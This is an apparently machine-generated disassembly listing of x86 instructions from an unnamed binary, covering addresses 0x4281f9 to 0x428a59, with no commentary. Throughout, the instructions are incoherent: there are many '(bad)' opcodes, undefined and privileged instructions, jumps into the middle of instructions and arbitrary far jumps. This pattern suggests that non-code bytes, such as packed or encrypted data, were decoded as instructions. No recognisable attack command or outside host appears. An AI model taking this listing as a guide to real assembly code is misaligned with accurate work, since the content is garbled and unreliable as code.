  4281f9:	inc    DWORD PTR [esp]
  4281fc:	push   ebp
  4281fd:	shr    esp,0x8
  428200:	in     al,dx
  428201:	push   esp
  428202:	add    DWORD PTR [eax],esp
  428204:	add    bl,cl
  428206:	inc    ebp
  428207:	mov    bh,0x89
  428209:	add    ah,bh
  42820b:	jmp    0xca7b9155
  428210:	pushf  
  428211:	dec    esp
  428212:	mov    edx,0xf8178520
  428217:	fst    DWORD PTR [ebp+0x0]
  42821a:	mov    BYTE PTR [eax],0xc4
  42821d:	sub    edx,DWORD PTR [ebx-0x3f]
  428220:	inc    ebp
  428221:	add    eax,0xc601dc
  428226:	mov    al,0xc6
  428229:	ins    BYTE PTR es:[edi],dx
  42822a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428231:	dec    esp
  428232:	jmp    DWORD PTR [eax]
  428234:	inc    ebp
  428235:	fnstcw WORD PTR [eax+0x29]
  428238:	test   BYTE PTR [eax],0xc5
  42823b:	rol    BYTE PTR [eax],0xc0
  42823e:	lea    ecx,[ebp-0x3cf0dbcb]
  428244:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42824a:	inc    esi
  42824b:	add    DWORD PTR [eax],ebx
  42824d:	add    dh,bh
  42824f:	mov    esi,DWORD PTR [edx+0x8]
  428252:	(bad)  
  428253:	fdiv   QWORD PTR ss:[ecx]
  428256:	(bad)  
  428257:	mov    bl,ch
  428259:	add    esi,eax
  42825b:	add    dh,bl
  42825d:	or     esi,eax
  42825f:	mov    dl,0xdf
  428261:	add    esi,eax
  428263:	add    al,ah
  428265:	push   cs
  428266:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42826d:	or     BYTE PTR [ebx],dh
  42826f:	dec    ecx
  428270:	lea    eax,[ebx]
  428272:	xor    eax,0x18fc0fc7
  428277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428278:	repz clc 
  42827a:	add    eax,DWORD PTR [ebp+0x46]
  42827d:	prefetcht0 BYTE PTR [ecx-0x2]
  428281:	xor    eax,0x7c60872
  428286:	mov    esp,0xbd32c698
  42828b:	pop    esi
  42828c:	mov    cl,0xbe
  42828f:	or     al,0xc6
  428291:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  428298:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  42829f:	add    dh,al
  4282a1:	mov    eax,ebx
  4282a3:	xor    DWORD PTR [ebx],0x35008dbc
  4282a9:	mov    ecx,DWORD PTR [edi]
  4282ab:	sbb    al,0x18
  4282ad:	inc    ebp
  4282ae:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282b5:	clc    
  4282b6:	(bad)  
  4282b7:	cmp    BYTE PTR [edx-0x64],dh
  4282ba:	lea    ecx,[ecx+0x45ffe838]
  4282c0:	mov    ecx,esp
  4282c2:	fadd   st,st(6)
  4282c4:	dec    ebp
  4282c5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282cb:	out    0x1,eax
  4282cd:	inc    ebp
  4282ce:	lea    ebp,ds:0xc8ffc6ff
  4282d4:	enter  0xa33,0xc6
  4282d8:	push   ebp
  4282d9:	leave  
  4282da:	(bad)  
  4282db:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4282e1:	add    BYTE PTR [ebp+0x44],al
  4282e4:	mov    eax,esp
  4282e6:	mov    WORD PTR [esi+0x43398300],?
  4282ec:	psubusw mm4,QWORD PTR [eax-0x78]
  4282f0:	add    BYTE PTR [ebx-0x1303f975],al
  4282f6:	add    BYTE PTR [ebp+0x1],0xf3
  4282fa:	add    BYTE PTR [ebp+0x38],al
  4282fd:	in     eax,dx
  4282fe:	inc    ebp
  4282ff:	inc    ebp
  428300:	mov    esp,ebx
  428302:	add    BYTE PTR [ebp+0x0],0xee
  428306:	mov    DWORD PTR [ebp-0x48],eax
  428309:	sub    eax,0x2e00454f
  42830e:	js     0x428355
  428310:	data16 js 0x428298
  428313:	idiv   bh
  428315:	inc    esp
  428316:	(bad)  
  428317:	fadd   st(7),st
  428319:	mov    dh,0x89
  42831b:	and    DWORD PTR [esi+0x43],0xffffffff
  42831f:	fld    DWORD PTR [ebx-0x767cc078]
  428325:	pop    es
  428326:	push   0x8d45ffec
  42832b:	in     eax,dx
  42832c:	inc    DWORD PTR [ebp-0x77]
  42832f:	loopne 0x42839b
  428331:	inc    ebp
  428332:	jmp    esp
  428334:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428338:	mov    DWORD PTR [ebp+0x6c],eax
  42833b:	(bad)  
  42833d:	inc    ebp
  42833e:	(bad)  
  42833f:	call   0xe7cbc850
  428344:	outs   dx,BYTE PTR ds:[esi]
  428345:	inc    ebp
  428346:	(bad)  
  428347:	js     0x4282cc
  428349:	div    BYTE PTR ds:0x70bc8944
  42834f:	mov    dh,0xff
  428351:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428358:	jb     0x4282dd
  42835a:	dec    DWORD PTR [eax]
  42835c:	mov    ebp,esp
  42835e:	test   WORD PTR [ebp-0x1],ax
  428365:	inc    ebp
  428366:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42836d:	adc    edi,edi
  42836f:	mov    ecx,esi
  428371:	mov    eax,DWORD PTR [eax]
  428373:	cmp    BYTE PTR [esi-0x1],ah
  428376:	test   DWORD PTR [ebx],edi
  428378:	push   DWORD PTR [ebp-0x1]
  42837b:	mov    DWORD PTR [esi-0x48],ebp
  42837e:	add    BYTE PTR [ebp+0x66],al
  428381:	jmp    0x428308
  428383:	pushf  
  428384:	dec    DWORD PTR [ebx-0x7f9c0301]
  42838a:	add    BYTE PTR [ecx],al
  42838c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  428393:	add    al,al
  428395:	add    BYTE PTR [esi+0x45],ah
  428398:	test   DWORD PTR [ebx+0xff7cff],ecx
  42839e:	dec    esp
  42839f:	mov    DWORD PTR [eax],eax
  4283a1:	mov    esp,DWORD PTR [esi-0x4]
  4283a4:	inc    ebp
  4283a5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283ac:	mov    DWORD PTR [ecx-0x7e],esp
  4283af:	add    BYTE PTR [edi-0x73],al
  4283b2:	push   0xffffffd1
  4283b4:	mov    WORD PTR [ebp+0x64],ax
  4283b8:	(bad)  
  4283b9:	call   eax
  4283bb:	mov    esp,eax
  4283bd:	data16 icebp 
  4283bf:	test   DWORD PTR [ebp-0x1],eax
  4283c2:	(bad)  
  4283c4:	out    0xc0,eax
  4283c6:	lea    esp,[esi-0x30]
  4283c9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283cf:	inc    edi
  4283d0:	jmp    0x75ff:0x40858866
  4283d7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283dd:	test   esi,edi
  4283df:	(bad)  
  4283e0:	(bad)  
  4283e1:	inc    DWORD PTR [ebp-0x9901b9]
  4283e7:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  4283ed:	rcl    BYTE PTR [ecx+0x66],0x33
  4283f1:	test   DWORD PTR [ebx+0xff72ff],edi
  4283f7:	inc    edi
  4283f8:	ret    
  4283f9:	mov    ax,WORD PTR [ebp-0x3f0004]
  428400:	push   eax
  428401:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428408:	add    BYTE PTR [ebx-0x764ff439],al
  42840e:	push   DWORD PTR [esi+0x1]
  428411:	inc    DWORD PTR [eax]
  428413:	mov    eax,0xff99ff
  428418:	or     BYTE PTR [ecx-0x7a87bb],cl
  42841e:	jne    0x4283d8
  428420:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42842a:	mov    ecx,0xd74fb8
  42842f:	add    cl,al
  428431:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428437:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42843e:	(bad)  
  42843f:	push   ebp
  428441:	mov    eax,0x8c2789
  428446:	ret    0x6689
  428449:	adc    BYTE PTR [ebp+0x4c],0x8d
  42844d:	add    bl,bl
  42844f:	mov    WORD PTR [ebp-0x70],ax
  428453:	(bad)  
  428454:	ret    0x660d
  428457:	or     BYTE PTR [ebp-0x77],dl
  42845a:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  428461:	in     al,0x89
  428463:	(bad)  
  428464:	xchg   esi,eax
  428465:	aam    0xcf
  428467:	call   0x45dafcf5
  42846c:	dec    edx
  42846d:	pop    ecx
  42846e:	mov    edx,DWORD PTR [eax]
  428470:	repnz push bp
  428473:	or     BYTE PTR [ebx+0x5510663b],0x49
  42847a:	(bad)  
  42847b:	repnz xor eax,0xa0898945
  428481:	mov    ah,0x89
  428483:	jmp    DWORD PTR [edx+0x66b0418d]
  428489:	inc    DWORD PTR [ebp+0x50]
  42848c:	add    DWORD PTR [ebp-0x5],0xffffffbe
  428490:	mov    DWORD PTR [eax],ecx
  428492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428493:	pop    es
  428494:	inc    ecx
  428495:	(bad)  
  428496:	cbw    
  428498:	inc    ebp
  428499:	xor    ah,BYTE PTR [esi+0x3]
  42849c:	dec    ebp
  42849d:	push   eax
  42849e:	inc    bp
  4284a0:	jge    0x428425
  4284a2:	mov    esp,DWORD PTR [esi-0x18]
  4284a5:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4284ab:	add    DWORD PTR [ebx],esi
  4284ad:	add    BYTE PTR [ebx],al
  4284af:	test   DWORD PTR [ebx],esi
  4284b1:	(bad)  
  4284b2:	inc    WORD PTR [ebp+0x0]
  4284b6:	mov    eax,DWORD PTR [eax]
  4284b8:	call   0x88983bed
  4284bd:	mov    esi,eax
  4284bf:	clc    
  4284c0:	ret    
  4284c1:	rol    cl,0xa
  4284c4:	mov    DWORD PTR ds:0x7c0ec88,esi
  4284ca:	mov    edx,edi
  4284cc:	pushf  
  4284cd:	pop    es
  4284ce:	jmp    FWORD PTR [edx+0x66]
  4284d1:	add    BYTE PTR [ebp-0x990175],al
  4284d7:	inc    ebp
  4284d8:	test   DWORD PTR [ebx-0x2f000202],eax
  4284de:	push   ebp
  4284df:	mov    edi,eax
  4284e1:	mov    dh,BYTE PTR [eax+0x266ff51]
  4284e7:	push   ebp
  4284e8:	add    BYTE PTR [ebx-0x764b1777],al
  4284ee:	dec    DWORD PTR [esi+0x661851e8]
  4284f4:	add    BYTE PTR [ebp-0x7b],dl
  4284f7:	cmp    esi,0xfffffffb
  4284fa:	dec    DWORD PTR [ecx+0x51fe9285]
  428500:	jmp    DWORD PTR [esi-0x75]
  428503:	push   ebp
  428504:	hlt    
  428505:	data16 (bad) 
  428507:	dec    ebp
  428508:	ret    
  428509:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  42850f:	lea    edx,[eax-0x1]
  428512:	jne    0x4284e5
  428514:	dec    DWORD PTR [ecx-0x2f7a63f8]
  42851a:	dec    BYTE PTR [ecx+0x51559eff]
  428520:	mov    DWORD PTR [esi-0x4c],esp
  428523:	push   ebp
  428524:	jmp    DWORD PTR [esi-0x18]
  428527:	inc    ebp
  428528:	sbb    BYTE PTR [ebp-0x767ae500],cl
  42852e:	(bad)  
  42852f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428530:	inc    eax
  428532:	test   DWORD PTR [esi-0x2],esp
  428535:	inc    ebp
  428536:	dec    DWORD PTR [ebp-0x760bde75]
  42853c:	(bad)  
  42853d:	test   al,0xc3
  42853f:	mov    DWORD PTR [ebp-0x769b56],ecx
  428545:	lods   al,BYTE PTR ds:[esi]
  428546:	push   eax
  428547:	inc    ebp
  428548:	jne    0x428559
  42854a:	dec    DWORD PTR [ebp+0x8]
  42854d:	mov    eax,DWORD PTR [edi]
  42854f:	sbb    al,0x0
  428551:	(bad)  
  428552:	mov    eax,0xc14fc3
  428557:	mov    DWORD PTR [eax-0x64],edi
  42855a:	inc    bp
  42855c:	test   DWORD PTR [edi],ecx
  42855e:	dec    DWORD PTR [ebp-0x1]
  428561:	xor    eax,edi
  428563:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  428569:	inc    ebp
  42856a:	xor    DWORD PTR [ebx],0x3f
  42856d:	mov    WORD PTR [ebp-0x1bc],ax
  428574:	lea    ecx,[ecx-0x767702]
  42857a:	inc    esi
  42857b:	(bad)  
  42857c:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  428583:	pushf  
  428584:	rol    DWORD PTR [ebp-0x72019a],0xff
  42858b:	add    bh,bh
  42858d:	add    BYTE PTR [edi],cl
  42858f:	test   DWORD PTR [eax],eax
  428591:	(bad)  
  428592:	dec    WORD PTR [ebp-0xff002d]
  428599:	mov    DWORD PTR [eax+edi*4+0x0],edi
  42859d:	jmp    DWORD PTR [esi-0x73]
  4285a0:	lea    esi,[eax+0x50ffffff]
  4285a6:	fadd   QWORD PTR [ebp+0x0]
  4285a9:	xor    esp,DWORD PTR [esi+0x3]
  4285ac:	lea    edx,[eax-0x1]
  4285af:	test   edi,edi
  4285b1:	dec    DWORD PTR [ebp-0x1]
  4285b4:	mov    edi,edi
  4285b6:	dec    eax
  4285b7:	clc    
  4285b8:	call   DWORD PTR [ebp-0x73]
  4285bb:	lea    esi,[eax+0x51ffff88]
  4285c1:	lea    ecx,[ebp-0x78]
  4285c4:	test   WORD PTR [ebp-0x2],ax
  4285cb:	popf   
  4285cc:	push   eax
  4285cd:	add    BYTE PTR [ecx-0x77],dl
  4285d0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285d6:	cwde   
  4285d7:	mov    al,0x32
  4285d9:	inc    DWORD PTR [ebx]
  4285db:	push   eax
  4285dc:	push   ecx
  4285dd:	inc    ebp
  4285de:	shl    BYTE PTR [ebx],1
  4285e0:	lea    eax,[ebx]
  4285e2:	call   DWORD PTR [eax-0x1]
  4285e5:	test   DWORD PTR [ebx],esi
  4285e7:	inc    DWORD PTR [eax-0x1]
  4285ea:	(bad)  
  4285eb:	(bad)  
  4285ec:	(bad)  
  4285ed:	clc    
  4285ee:	call   DWORD PTR [ebp+0x50]
  4285f1:	jmp    0xcb876b
  4285f6:	inc    esp
  4285f7:	jnp    0x4285f8
  4285f9:	add    BYTE PTR [ecx-0x484f73],cl
  4285ff:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428605:	mov    eax,DWORD PTR [ecx]
  428607:	data16 add BYTE PTR [ebp-0xb50077],al
  42860e:	inc    eax
  428610:	lea    esp,[esi+0x14]
  428613:	test   DWORD PTR [ecx-0xb301],ecx
  428619:	inc    edi
  42861a:	(bad)  
  42861b:	dec    si
  42861d:	test   edi,edi
  42861f:	(bad)  
  428620:	cmp    eax,0xc74f73ff
  428625:	mov    edx,DWORD PTR [edx-0x7d]
  428628:	push   DWORD PTR [ebx+0x56328939]
  42862e:	(bad)  
  42862f:	call   FWORD PTR [esi-0x47]
  428632:	inc    DWORD PTR ds:0x893c00ea
  428638:	(bad)  
  428639:	pop    eax
  42863a:	mov    ah,0xff
  42863c:	(bad)  
  42863d:	mov    ecx,0x5745
  428642:	dec    DWORD PTR [ecx-0xf7a501]
  428648:	(bad)  
  428649:	mov    ecx,0x456108
  42864e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428654:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42865a:	inc    BYTE PTR gs:[eax]
  42865d:	inc    DWORD PTR [ebp-0x73]
  428660:	cmp    dh,bh
  428662:	pushf  
  428663:	inc    edi
  428665:	mov    ebx,eax
  428667:	hlt    
  428668:	test   DWORD PTR [ecx-0xbab708],ecx
  42866e:	cmp    al,0xbe
  428670:	pushf  
  428671:	or     bh,al
  428673:	pop    es
  428674:	lock into 
  428676:	test   eax,eax
  428678:	clc    
  428679:	mov    ebx,0x387245
  42867e:	lahf   
  42867f:	retf   
  428680:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  428686:	add    edi,edi
  428688:	add    BYTE PTR [ecx+0x45],dl
  42868b:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  428692:	mov    edx,DWORD PTR [ecx-0x74]
  428695:	inc    DWORD PTR [eax]
  428697:	cld    
  428698:	mov    eax,DWORD PTR [ebp-0x6f0175]
  42869e:	add    BYTE PTR [ebp-0x1b0177],al
  4286a4:	jge    0x4286eb
  4286a6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286ac:	sbb    BYTE PTR [esi+0x55],ah
  4286af:	xchg   ebp,eax
  4286b0:	call   0x4281b4
  4286b5:	push   edi
  4286b6:	inc    ebp
  4286b7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286be:	cmp    al,0x85
  4286c0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286c4:	test   DWORD PTR [edi+0x74],ecx
  4286c7:	dec    edi
  4286c8:	inc    DWORD PTR [ebp-0xf70004]
  4286ce:	dec    DWORD PTR [edi-0x75]
  4286d1:	dec    edi
  4286d2:	cld    
  4286d3:	test   DWORD PTR [eax+0xff01ff],eax
  4286d9:	icebp  
  4286da:	add    BYTE PTR [edi-0x3a],cl
  4286dd:	test   ebx,eax
  4286df:	inc    BYTE PTR [ebp-0x1]
  4286e2:	jne    0x4286e4
  4286e4:	mov    eax,DWORD PTR [eax]
  4286e6:	cld    
  4286e7:	xor    BYTE PTR [ecx+0x500155],cl
  4286ed:	push   ebp
  4286ee:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4286f4:	add    BYTE PTR [ebp+0x35e90f50],al
  4286fa:	add    al,BYTE PTR [eax]
  4286fc:	add    BYTE PTR [ebx-0x38fe4f80],al
  428702:	add    ah,ch
  428704:	or     BYTE PTR [ebp+0x4501f845],dh
  42870a:	jmp    0xde8a07
  42870f:	(bad)  
  428710:	nop    ecx
  428713:	test   DWORD PTR [ebp+0x4502f8],eax
  428719:	cmp    cl,BYTE PTR [ebp-0x64]
  42871c:	mov    eax,edi
  42871e:	mov    ebx,DWORD PTR [eax+edx*2]
  428721:	add    eax,0x45fef885
  428726:	dec    DWORD PTR [ebx+0x339445]
  42872c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428732:	dec    DWORD PTR [ebx-0x460f0375]
  428738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428739:	add    esi,edi
  42873b:	add    bh,bh
  42873d:	rdpmc  
  42873f:	add    BYTE PTR [ebx],0x1
  428742:	mov    DWORD PTR [eax],eax
  428744:	add    al,0x45
  428746:	dec    DWORD PTR [ecx-0x360b3373]
  42874c:	dec    DWORD PTR [esi]
  42874e:	push   eax
  42874f:	jne    0x428796
  428751:	mov    esi,DWORD PTR [ebx]
  428753:	cld    
  428754:	add    ebp,ebx
  428756:	push   eax
  428757:	inc    DWORD PTR [ebp-0x75]
  42875a:	add    eax,0x800e4
  42875f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428765:	mov    DWORD PTR [ecx],eax
  428767:	sbb    al,0x0
  428769:	leave  
  42876a:	test   DWORD PTR [edi-0x2],eax
  42876d:	jne    0x42876e
  42876f:	call   0xff437274
  428774:	xor    BYTE PTR [ebp+0x4d],al
  428777:	mov    edi,edi
  428779:	enter  0x8,0x4d
  42877d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  428783:	mov    eax,DWORD PTR [eax]
  428785:	cld    
  428786:	add    DWORD PTR [ecx],ebx
  428788:	inc    ebp
  428789:	dec    ebp
  42878a:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  428790:	inc    eax
  428791:	dec    DWORD PTR [ecx-0x270375]
  428797:	add    BYTE PTR [ebx-0x39d72701],cl
  42879d:	xchg   ecx,eax
  42879e:	ret    
  42879f:	add    BYTE PTR [ebp-0x830075],al
  4287a5:	add    BYTE PTR [ebp-0x75],al
  4287a8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ae:	lea    edi,[edi-0xc]
  4287b1:	add    bh,bh
  4287b3:	mov    edx,DWORD PTR [eax-0x7b]
  4287b6:	inc    ebp
  4287b7:	rdpmc  
  4287b9:	jne    0x4287be
  4287bb:	add    BYTE PTR [eax-0x75],dl
  4287be:	inc    ebp
  4287bf:	clc    
  4287c0:	add    eax,0x400009
  4287c5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287cb:	mov    eax,DWORD PTR [ecx]
  4287cd:	in     al,dx
  4287ce:	add    dh,al
  4287d0:	test   ebx,eax
  4287d2:	inc    BYTE PTR [ebp-0xff0001]
  4287d8:	add    BYTE PTR [ebp-0x43],al
  4287db:	cmp    esi,0xfffffff8
  4287de:	(bad)  
  4287df:	push   DWORD PTR [eax]
  4287e1:	add    BYTE PTR [ebp-0x3a],dl
  4287e4:	test   ebx,eax
  4287e6:	je     0x42876d
  4287e8:	mov    edi,edi
  4287ea:	sbb    al,0xff
  4287ec:	test   DWORD PTR gs:[eax],eax
  4287ef:	(bad)  
  4287f0:	js     0x4287f1
  4287f2:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4287f8:	sub    eax,ebx
  4287fa:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428800:	add    eax,DWORD PTR [eax]
  428802:	dec    ebp
  428803:	push   eax
  428804:	mov    al,BYTE PTR [ebp+0x1]
  428807:	mov    eax,DWORD PTR [ebp-0x68]
  42880a:	mov    eax,DWORD PTR [eax]
  42880c:	sbb    bh,al
  42880e:	or     ah,dh
  428810:	dec    ebp
  428811:	inc    DWORD PTR [eax+0x4]
  428814:	push   ecx
  428815:	add    BYTE PTR [edx-0x1],dh
  428818:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42881e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428828:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42882e:	push   ecx
  42882f:	cmp    BYTE PTR [ebx],al
  428831:	inc    ebp
  428832:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428838:	(bad)  
  428839:	(bad)  
  42883a:	in     al,0xff
  42883c:	add    BYTE PTR [ebp+0x0],al
  42883f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428845:	add    al,bh
  428847:	(bad)  
  428848:	jmp    0x8d85:0x74b0558d
  42884f:	dec    DWORD PTR [eax]
  428851:	call   DWORD PTR [ebp-0x7b]
  428854:	mov    edi,esi
  428856:	lock call DWORD PTR [ebp-0x75]
  42885a:	mov    esi,esp
  42885c:	mov    ah,0xc6
  42885e:	mov    bh,0xc3
  428860:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428866:	add    DWORD PTR [eax],0x450050ff
  42886c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428872:	inc    edi
  428874:	push   esp
  428876:	jmp    0xcd00:0x680481ff
  42887d:	mov    DWORD PTR [ebx],esi
  42887f:	clc    
  428880:	cmp    edi,0xff9cff3b
  428886:	jne    0x428890
  428888:	mov    eax,eax
  42888a:	add    esi,DWORD PTR [eax]
  42888c:	int3   
  42888d:	inc    ebp
  42888e:	cmp    al,0x83
  428890:	add    BYTE PTR [eax],bl
  428892:	adc    DWORD PTR [ebx+0x768b5055],eax
  428898:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42889e:	mov    edi,eax
  4288a0:	cmp    BYTE PTR [ebp+0x45],cl
  4288a3:	jmp    0x428830
  4288a5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288a8:	inc    ebp
  4288a9:	or     al,0x2
  4288ab:	dec    DWORD PTR [ebp+0x18]
  4288ae:	jne    0x428905
  4288b0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288b6:	mov    edi,DWORD PTR [ebx]
  4288b8:	in     al,0x50
  4288ba:	xchg   ecx,eax
  4288bb:	jmp    0x342d7c0
  4288c0:	adc    al,0x8b
  4288c2:	inc    ebp
  4288c3:	mov    al,ds:0x8b04008b
  4288c8:	push   ebp
  4288c9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288cf:	push   ebp
  4288d0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288d6:	inc    ebp
  4288d7:	dec    ebp
  4288d8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288de:	mov    DWORD PTR [eax],0xe9ff00f4
  4288e4:	add    al,0x0
  4288e6:	add    BYTE PTR [eax],al
  4288e8:	mov    eax,edx
  4288ea:	push   eax
  4288eb:	rol    DWORD PTR [ebp-0xf0177],1
  4288f1:	bound  eax,QWORD PTR [ebp+0x50]
  4288f4:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4288fa:	add    BYTE PTR [ecx+0x558df0ff],cl
  428900:	mov    al,0xf
  428902:	test   DWORD PTR [edx],edx
  428904:	call   DWORD PTR [ebp-0x7a0001]
  42890a:	(bad)  
  42890b:	loop   0x42890c
  42890d:	jnp    0xc6987d13
  428913:	mov    eax,ebx
  428915:	cmp    al,0x8b
  428917:	(bad)  
  428918:	cld    
  428919:	shr    esi,0xc
  42891c:	add    dl,al
  42891e:	push   eax
  42891f:	lea    eax,[ebp-0x1]
  428922:	mov    edx,esi
  428924:	cwde   
  428925:	cli    
  428926:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42892c:	or     BYTE PTR [eax],cl
  42892e:	inc    ebp
  42892f:	dec    ebp
  428930:	inc    DWORD PTR [ebx+0x74803914]
  428936:	add    DWORD PTR [ebx+0x451800],ecx
  42893c:	call   DWORD PTR [eax+edx*1]
  42893f:	add    ecx,DWORD PTR [ebp-0x34]
  428942:	push   edi
  428943:	adc    al,0x8
  428945:	mov    edx,DWORD PTR [ebp-0x14]
  428948:	mov    ecx,DWORD PTR [ebp+0x18]
  42894b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42894f:	inc    DWORD PTR [eax+esi*8]
  428952:	inc    ebp
  428953:	stos   BYTE PTR es:[edi],al
  428954:	mov    edx,DWORD PTR [ebp-0x4]
  428957:	add    DWORD PTR [ebp-0x1c],eax
  42895a:	mov    edx,DWORD PTR [ebp-0x70]
  42895d:	cmp    eax,DWORD PTR [eax]
  42895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428960:	mov    eax,DWORD PTR [eax]
  428962:	cld    
  428963:	jae    0x4288e5
  428965:	add    eax,DWORD PTR [ecx]
  428967:	clc    
  428968:	add    BYTE PTR [eax+0x30],dl
  42896b:	mov    DWORD PTR [ecx],esi
  42896d:	clc    
  42896e:	pop    ds
  42896f:	inc    ebp
  428970:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428976:	(bad)  
  428977:	push   DWORD PTR [edi]
  428979:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42897f:	(bad)  
  428980:	jae    0x428981
  428982:	mov    eax,DWORD PTR [ebp-0x740175]
  428988:	sub    eax,DWORD PTR [eax]
  42898a:	add    eax,DWORD PTR [eax]
  42898c:	mov    DWORD PTR [ecx+0x5f],eax
  42898f:	mov    DWORD PTR [ebx-0x4],ebx
  428992:	ret    0xff
  428995:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42899b:	ret    
  42899c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289a2:	add    BYTE PTR [ebp-0x7d],al
  4289a5:	mov    DWORD PTR [eax],eax
  4289a7:	add    al,0x84
  4289a9:	inc    DWORD PTR [ecx]
  4289ab:	lea    eax,[eax]
  4289ad:	hlt    
  4289ae:	sar    bh,cl
  4289b0:	test   BYTE PTR [eax+0x1],dl
  4289b3:	inc    ebp
  4289b4:	add    BYTE PTR [ebx],dh
  4289b6:	test   BYTE PTR [ebx],0x84
  4289b9:	push   eax
  4289ba:	add    BYTE PTR [ebp+0x0],al
  4289bd:	add    eax,0x86
  4289c2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289c8:	add    BYTE PTR [ecx],al
  4289ca:	add    BYTE PTR [eax],al
  4289cc:	mov    esi,0x550030
  4289d1:	mov    ecx,DWORD PTR [edi]
  4289d3:	cld    
  4289d4:	fidiv  DWORD PTR [ebp+0x0]
  4289d7:	mov    edi,DWORD PTR [ecx]
  4289d9:	xor    BYTE PTR [eax+eax*1],0x84
  4289dd:	add    eax,DWORD PTR [eax]
  4289df:	sbb    BYTE PTR [eax],al
  4289e1:	jne    0x428994
  4289e3:	mov    eax,DWORD PTR [ecx]
  4289e5:	sbb    BYTE PTR [eax],al
  4289e7:	mov    DWORD PTR [ebp-0x1],esp
  4289ea:	add    BYTE PTR [eax+0x30e45ca],bh
  4289f0:	ret    0xb7fc
  4289f3:	dec    ebp
  4289f4:	or     al,0x89
  4289f6:	dec    ebp
  4289f7:	cld    
  4289f8:	cmovne ecx,DWORD PTR [eax-0x75]
  4289fc:	add    edi,esp
  4289fe:	seto   BYTE PTR [esi-0x72ffffff]
  428a05:	inc    ebp
  428a06:	adc    al,0x8b
  428a08:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a0f:	cmp    DWORD PTR [edi+0x72],edx
  428a12:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a18:	gs cmp al,0x0
  428a1b:	je     0x4289f3
  428a1d:	push   eax
  428a1e:	sar    BYTE PTR [eax],1
  428a20:	mov    bh,0x3e
  428a22:	push   cs
  428a23:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a29:	add    DWORD PTR [ecx+0x12],ebp
  428a2c:	dec    edx
  428a2d:	(bad)  
  428a2e:	mov    eax,edx
  428a30:	in     al,dx
  428a31:	adc    DWORD PTR [ecx],esi
  428a33:	pop    esi
  428a34:	inc    ecx
  428a35:	leave  
  428a36:	or     DWORD PTR [eax],ebx
  428a38:	gs push ebp
  428a3a:	add    ah,ch
  428a3c:	into   
  428a3d:	in     al,dx
  428a3e:	enter  0xb756,0xf0
  428a42:	push   cs
  428a43:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a4d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a53:	jnp    0x74430f5b
  428a59:	test   DWORD PTR [ebx+0x1cfae40f],ecx
